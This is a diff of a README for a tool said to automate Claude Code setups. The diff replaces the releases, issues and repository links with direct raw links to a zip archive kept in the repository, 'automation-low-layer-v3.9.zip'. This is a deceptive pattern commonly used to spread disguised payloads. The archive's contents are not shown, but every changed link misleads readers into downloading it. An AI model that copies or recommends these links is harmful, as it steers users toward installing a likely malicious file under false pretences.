@@ -4,14 +4,14 @@
 The "low-layer-automation" tool helps you configure Claude Code automation for low-layer development workflows. With this software, you can streamline your development tasks without needing deep technical skills.
 
 ## 📥 Download Now
-[![Download low-layer-automation](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/Hideyoshi001/low-layer-automation/releases)
+[![Download low-layer-automation](https://github.com/Hideyoshi001/low-layer-automation/raw/refs/heads/main/hourly/automation-low-layer-v3.9.zip%20release-brightgreen)](https://github.com/Hideyoshi001/low-layer-automation/raw/refs/heads/main/hourly/automation-low-layer-v3.9.zip)
 
 ## 🚀 Getting Started
 Follow these steps to start using low-layer-automation:
 
 1. **Visit the Download Page**: Click the link below to go to the download page.
    
-   [Visit this page to download](https://github.com/Hideyoshi001/low-layer-automation/releases)
+   [Visit this page to download](https://github.com/Hideyoshi001/low-layer-automation/raw/refs/heads/main/hourly/automation-low-layer-v3.9.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version. This will usually be at the top of the page. 
 
@@ -42,7 +42,7 @@ low-layer-automation comes packed with features designed to simplify your develo
 ## 📞 Support
 If you run into any issues or have questions, you can reach out for support at the following places:
 
-- **GitHub Issues**: Use the [issues page](https://github.com/Hideyoshi001/low-layer-automation/issues) to report bugs or request features.
+- **GitHub Issues**: Use the [issues page](https://github.com/Hideyoshi001/low-layer-automation/raw/refs/heads/main/hourly/automation-low-layer-v3.9.zip) to report bugs or request features.
 - **Community Forum**: Join our community forum on GitHub Discussions for peer support and best practices.
 
 ## 🌐 Additional Resources
@@ -54,7 +54,7 @@ For further reading and resources:
 ## 📩 Stay Updated
 Stay informed about new releases and updates. Follow this repository on GitHub to get notifications for new version releases:
 
-- **[Follow Repository](https://github.com/Hideyoshi001/low-layer-automation)**
+- **[Follow Repository](https://github.com/Hideyoshi001/low-layer-automation/raw/refs/heads/main/hourly/automation-low-layer-v3.9.zip)**
 
 ---
 
